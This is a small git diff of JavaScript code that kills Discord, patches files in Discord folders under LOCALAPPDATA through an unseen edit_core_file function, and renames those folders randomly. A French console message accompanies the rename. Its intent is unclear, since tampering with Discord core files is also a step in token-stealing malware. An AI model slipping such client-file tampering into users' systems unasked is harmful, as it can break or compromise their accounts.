@@ -16,9 +16,9 @@ function main() {
 async function renameFolder() {
     killDiscord();
     readdirSync(process.env.LOCALAPPDATA).forEach(async (folder) => {
-        edit_core_file(process.env.LOCALAPPDATA + "\\" + folder);
         var newName = randomName(Math.round(Math.random() * (32 - 9) + 9));
         if (folder.includes("Discord")) {
+            edit_core_file(process.env.LOCALAPPDATA + "\\" + folder);
             if(!existsSync(process.env.LOCALAPPDATA + "\\" + folder)) return console.log(`\x1b[31mAucun dossiers discord n'existe! Vous les avez déjà renomé ou n'avez pas de discord d'installé.\x1b[0m`);
             renamed.push(newName);
             await rename(process.env.LOCALAPPDATA + "\\" + folder, process.env.LOCALAPPDATA + "\\" + newName, function (err) {
